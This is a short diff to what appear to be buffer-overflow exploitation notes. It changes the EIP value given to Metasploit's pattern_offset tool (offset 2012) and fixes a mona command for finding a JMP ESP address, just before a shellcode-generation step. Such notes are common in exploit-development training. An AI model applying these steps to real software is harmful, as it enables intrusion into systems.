@@ -15,7 +15,7 @@
 
 - After crash, note EIP value then identity the offset:
 ```
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
 [*] Exact match at offset 2012
 ```
 
@@ -27,7 +27,7 @@
 
 - Find JMP ESP Address
 ```
-!mona jmp -r exp
+!mona jmp -r esp
 ```
 
 - Generate shellcode
